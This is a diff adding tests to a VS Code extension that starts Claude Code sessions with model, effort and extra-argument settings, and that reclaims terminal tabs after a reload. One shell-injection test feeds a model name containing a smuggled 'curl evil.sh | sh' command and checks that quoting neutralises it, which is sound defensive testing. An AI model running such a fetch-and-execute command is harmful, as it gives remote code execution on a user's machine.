@@ -40,9 +40,16 @@ function activate({ segments, workspace = '', settings = {} } = {}) {
     });
     vscode.__setWorkspace(workspace);
     const storage = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-ext-'));
+    const memory = new Map();
     const context = {
         subscriptions: [],
         globalStorageUri: { fsPath: storage },
+        // The real one persists across windows; here it only has to survive one
+        // activate, which is what the tab register is asked to do.
+        globalState: {
+            get: (key) => memory.get(key),
+            update: (key, value) => { memory.set(key, value); },
+        },
         // The real one points at the installed extension; here it points at the
         // repository, which is the same tree the icons are read from.
         extensionUri: { fsPath: path.join(__dirname, '..'), scheme: 'file' },
@@ -224,6 +231,105 @@ test('the manifest offers exactly the places the button knows', () => {
     assert.deepEqual(property.enum, db.PLACES.map(([value]) => value));
     assert.equal(property.enum.length, property.enumDescriptions.length);
     assert.ok(ext.__PLACES[property.default], 'the default is one of them');
+});
+
+// The launch settings end up on a command line, so where they may come from is
+// the whole of their safety. A repository carries its own `.vscode/settings.json`
+// and VS Code lets it override anything of the default `window` scope — which
+// for free text written into a shell means a cloned project could run whatever
+// it liked the moment the button was pressed. `machine` scope is VS Code's own
+// answer: user settings only. The other two need no such guard because a value
+// outside their list is not passed at all.
+// Three places offer the same two vocabularies — the settings dropdown, the
+// Settings tab and the quick pick — and only one list exists, in dashboard.js.
+// This is what says so out loud.
+test('the manifest offers exactly the models and efforts the page does', () => {
+    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
+    const props = manifest.contributes.configuration.properties;
+    for (const [key, list] of [['model', db.MODELS], ['effort', db.EFFORTS], ['advisor', db.ADVISORS]]) {
+        const property = props[`claudeStatusline.${key}`];
+        assert.deepEqual(property.enum, list.map(([value]) => value));
+        assert.equal(property.enum.length, property.enumDescriptions.length);
+        assert.equal(property.default, '', 'empty is the default: no flag, the client decides');
+    }
+});
+
+test('a workspace cannot supply the free-text launch arguments', () => {
+    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
+    const props = manifest.contributes.configuration.properties;
+    assert.equal(props['claudeStatusline.launchArgs'].scope, 'machine');
+    for (const key of ['claudeStatusline.model', 'claudeStatusline.effort']) {
+        assert.ok(Array.isArray(props[key].enum) && props[key].enum.length > 1, `${key} must be a closed list`);
+    }
+});
+
+// The list in the manifest is a dropdown, not a guarantee: settings.json takes
+// any string. What makes that harmless is the quoting — a value with shell
+// syntax in it stays one argument to `claude` and is never a command of its own.
+test('shell syntax inside a model name stays a single argument', async () => {
+    const run = activate({ segments: ['{today}'], settings: { model: "opus'; curl evil.sh | sh; #" } });
+    try {
+        await openClaude();
+        const line = ranIn(lastTerminal());
+        assert.equal(line, `claude --model 'opus'\\''; curl evil.sh | sh; #'`);
+        assert.doesNotMatch(line, /^claude --model 'opus'; /, 'the quote must be escaped, not closed');
+    } finally { run.dispose(); }
+});
+
+// The Settings tab is the settings UI of this extension — a key it cannot reach
+// is a key that exists only in settings.json, which is what that tab was built
+// to avoid. The launch settings are no exception, and they are what a reader
+// goes looking for after reading about them.
+test('the launch settings are saved from the page like any other', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await panel.__receive({
+            type: 'save',
+            scope: 'global',
+            settings: { model: 'fable', effort: 'high', launchArgs: '--permission-mode acceptEdits' },
+        });
+        assert.equal(vscode.__updates.find((u) => u.key === 'model').value, 'fable');
+        assert.equal(vscode.__updates.find((u) => u.key === 'effort').value, 'high');
+        assert.equal(vscode.__updates.find((u) => u.key === 'launchArgs').value, '--permission-mode acceptEdits');
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// Writing a setting and never reading it back looks exactly like not saving it:
+// the page redraws from the config the extension hands it, so a key missing
+// there is a choice that appears to have been forgotten the moment it was made.
+test('the page shows the launch settings it was saved with', async () => {
+    const run = activate({
+        segments: ['{today}'],
+        settings: { model: 'opus[1m]', effort: 'max', launchArgs: '--fallback-model sonnet' },
+    });
+    let panel;
+    try {
+        panel = await openDashboard();
+        assert.match(panel.webview.html, /name="model" value="opus\[1m\]" checked/);
+        assert.match(panel.webview.html, /name="effort" value="max" checked/);
+        assert.match(panel.webview.html, /id="launchArgs"[^>]*value="--fallback-model sonnet"/);
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// `launchArgs` is machine-scoped, so writing it into a workspace is not a choice
+// the page can offer — VS Code refuses, and the whole save would fail with it.
+test('the free-text arguments go to the user settings whatever scope was picked', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await panel.__receive({
+            type: 'save',
+            scope: 'workspace',
+            settings: { model: 'opus', launchArgs: '--fallback-model sonnet' },
+        });
+        const model = vscode.__updates.find((u) => u.key === 'model');
+        const args = vscode.__updates.find((u) => u.key === 'launchArgs');
+        assert.equal(model.target, vscode.ConfigurationTarget.Workspace);
+        assert.equal(args.target, vscode.ConfigurationTarget.Global);
+    } finally { if (panel) panel.dispose(); run.dispose(); }
 });
 
 test('the commands the package manifest promises are all registered', () => {
@@ -766,6 +872,20 @@ async function openDashboard() {
 
 const lastPost = (panel) => panel.webview.posted[panel.webview.posted.length - 1];
 
+// A webview tab wears the generic editor glyph unless the panel is given an
+// icon of its own, and the dashboard's own mark is what a reader looks for among
+// twenty open tabs. `iconPath` is a property of the panel rather than an option
+// of `createWebviewPanel`, which is why it is easy to leave unset.
+test('the dashboard tab carries the extension icon', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        const shown = panel.iconPath && (panel.iconPath.fsPath || panel.iconPath.path || '');
+        assert.match(String(shown), /media\/icon\.svg$/);
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
 test('the settings tab previews a segment with the same code that draws the bar', async () => {
     const run = activate({ segments: ['{weekly}'] });
     let panel;
@@ -971,7 +1091,11 @@ test('the dashboard reads live numbers even when the context refuses new propert
     vscode.__reset();
     vscode.__setSettings({ segments: ['{weekly}'], alignment: 'right', priority: 100, refreshInterval: 3600 });
     const storage = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-frozen-'));
-    const context = Object.freeze({ subscriptions: [], globalStorageUri: { fsPath: storage } });
+    const context = Object.freeze({
+        subscriptions: [],
+        globalStorageUri: { fsPath: storage },
+        extensionUri: { fsPath: path.join(__dirname, '..'), scheme: 'file' },
+    });
     const unpin = pinLimits();
 
     let panel;
@@ -1311,6 +1435,86 @@ test('the command goes through shell integration when it arrives', async () => {
     } finally { run.dispose(); }
 });
 
+// The session can be started on a model and an effort of its own. The command is
+// built as text for a shell, so the one thing that has to be right is quoting:
+// `opus[1m]` unquoted is a glob, and zsh answers `no matches found` instead of
+// running anything.
+const ranIn = (terminal) => {
+    vscode.__shellIntegrationArrives(terminal);
+    return terminal.executed[0];
+};
+
+test('the model and the effort from the settings are passed to the session', async () => {
+    const run = activate({ segments: ['{today}'], settings: { model: 'opus[1m]', effort: 'max' } });
+    try {
+        await openClaude();
+        assert.equal(ranIn(lastTerminal()), "claude --model 'opus[1m]' --effort 'max'");
+    } finally { run.dispose(); }
+});
+
+// `--advisor` is a real flag the client hides from its own `--help`
+// (`.hideHelp()` on the option), which is exactly why it is worth a setting:
+// nobody finds it by reading the usage text.
+test('the advisor is passed too, after the model and the effort', async () => {
+    const run = activate({
+        segments: ['{today}'],
+        settings: { model: 'opus[1m]', effort: 'max', advisor: 'fable' },
+    });
+    try {
+        await openClaude();
+        assert.equal(ranIn(lastTerminal()), "claude --model 'opus[1m]' --effort 'max' --advisor 'fable'");
+    } finally { run.dispose(); }
+});
+
+test('a setting left empty adds no flag at all', async () => {
+    const run = activate({ segments: ['{today}'], settings: { model: '', effort: 'high' } });
+    try {
+        await openClaude();
+        assert.equal(ranIn(lastTerminal()), "claude --effort 'high'");
+    } finally { run.dispose(); }
+});
+
+test('extra launch arguments follow the flags, as written', async () => {
+    const run = activate({
+        segments: ['{today}'],
+        settings: { model: 'sonnet', launchArgs: '--permission-mode acceptEdits' },
+    });
+    try {
+        await openClaude();
+        assert.equal(ranIn(lastTerminal()), "claude --model 'sonnet' --permission-mode acceptEdits");
+    } finally { run.dispose(); }
+});
+
+// The one-off command asks instead of reading the settings, so a run that is not
+// like the others costs a pick rather than a trip to the settings and back.
+test('the "with…" command starts the session on what was picked, not on the settings', async () => {
+    const run = activate({ segments: ['{today}'], settings: { model: 'haiku', effort: 'low' } });
+    try {
+        vscode.__answerQuickPicks({ label: 'fable' }, { label: 'xhigh' });
+        await vscode.__commands.get('claudeStatusline.openClaudeWith')();
+        assert.equal(ranIn(lastTerminal()), "claude --model 'fable' --effort 'xhigh'");
+        assert.equal(vscode.__quickPicks.length, 2, 'one pick for the model and one for the effort');
+    } finally { run.dispose(); }
+});
+
+test('dismissing the model pick leaves the session unstarted', async () => {
+    const run = activate({ segments: ['{today}'] });
+    try {
+        await vscode.__commands.get('claudeStatusline.openClaudeWith')();
+        assert.deepEqual(vscode.__terminals, [], 'a dialog closed with escape is not a request to open anything');
+    } finally { run.dispose(); }
+});
+
+// A button that starts a session on a model chosen weeks ago should say so
+// before it is pressed, in the same hover that already names where it will land.
+test('the button says which model and effort it would start on', () => {
+    const run = activate({ segments: ['{today}'], settings: { model: 'opus[1m]', effort: 'max' } });
+    try {
+        const btn = vscode.__items.find((i) => i.id === 'claudeStatusline.open');
+        assert.match(String(btn.tooltip), /opus\[1m\].*max|max.*opus\[1m\]/s);
+    } finally { run.dispose(); }
+});
+
 test('a shell with no integration is typed into instead, and only once', async () => {
     const run = activate({ segments: ['{today}'] });
     try {
@@ -1464,12 +1668,12 @@ test('a terminal this extension did not open is left alone', async () => {
 });
 
 // A reload restarts the extension host while the shells keep running, so the
-// tabs come back with nothing tying them to the sessions inside them. What VS
-// Code does keep is what each was created with, and two things in there point
-// here: the icon, which is a file of this extension, and the name a tab is
-// opened under. Either is enough — and when neither survives, the tab is left
-// alone, which is what happened to every reloaded tab before.
+// tabs come back with nothing tying them to the sessions inside them — and with
+// almost nothing of how they were made: the extension host rebuilds
+// `creationOptions` from six fields, and the icon is not one of them. What is
+// left is the mark in the environment and this extension's own note of the pid.
 const OUR_ICON = { light: { fsPath: '/anywhere/media/open-claude-light.svg' }, dark: { fsPath: '/anywhere/media/open-claude-dark.svg' } };
+const OUR_ENV = { CLAUDE_DASHBOARD_TAB: '1' };
 
 // The pid a restored tab reports arrives through a promise, exactly as an opened
 // one's does, and taking it over waits for that — so the wait happens outside
@@ -1481,10 +1685,10 @@ const restoreTab = async (options) => {
     return terminal;
 };
 
-test('a tab restored after a reload is taken back over, by its icon', async () => {
+test('a tab restored after a reload is taken back over, by the mark in its environment', async () => {
     const run = activate({ segments: ['{today}'] });
     try {
-        const restored = await restoreTab({ name: 'renamed by a session', iconPath: OUR_ICON, pid: 707 });
+        const restored = await restoreTab({ name: 'renamed by a session', env: OUR_ENV, pid: 707 });
         await withSession({ shellPid: 707, sessionId: 'abc', cwd: '/w' }, 'Restored session', async () => {
             vscode.__activateTerminal(restored);
             await new Promise((r) => setImmediate(r));
@@ -1493,15 +1697,19 @@ test('a tab restored after a reload is taken back over, by its icon', async () =
     } finally { run.dispose(); }
 });
 
-test('a tab restored under the name it was opened with is taken back over too', async () => {
+test('a tab whose mark did not survive is taken back over by its pid', async () => {
     const run = activate({ segments: ['{today}'] });
     try {
-        const restored = await restoreTab({ name: 'Claude Code', pid: 808 });
-        await withSession({ shellPid: 808, sessionId: 'abc', cwd: '/w' }, 'By name', async () => {
+        // What the previous window left behind: the button opened a tab, and the
+        // pid of its shell went into the register.
+        const opened = await openActiveTab(808);
+        opened.dispose();
+        const restored = await restoreTab({ name: 'renamed by a session', pid: 808 });
+        await withSession({ shellPid: 808, sessionId: 'abc', cwd: '/w' }, 'By its pid', async () => {
             vscode.__activateTerminal(restored);
             await new Promise((r) => setImmediate(r));
         });
-        assert.deepEqual(renames(), ['By name']);
+        assert.deepEqual(renames(), ['By its pid']);
     } finally { run.dispose(); }
 });
 
@@ -1514,6 +1722,20 @@ test("a restored terminal of somebody else's is not taken over", async () => {
             await new Promise((r) => setImmediate(r));
         });
         assert.deepEqual(renames(), [], 'a session running in a tab this extension did not open is still their tab');
+    } finally { run.dispose(); }
+});
+
+// Claude Code's own button opens its terminals under exactly this name, so a
+// name match would rename and close a tab belonging to another extension.
+test("a restored tab named like ours but opened by somebody else is left alone", async () => {
+    const run = activate({ segments: ['{today}'] });
+    try {
+        const restored = await restoreTab({ name: 'Claude Code', iconPath: OUR_ICON, pid: 606 });
+        await withSession({ shellPid: 606, sessionId: 'abc', cwd: '/w' }, 'Their tab', async () => {
+            vscode.__activateTerminal(restored);
+            await new Promise((r) => setImmediate(r));
+        });
+        assert.deepEqual(renames(), [], 'the name and the icon are not evidence: neither survives a reload of ours');
     } finally { run.dispose(); }
 });
 
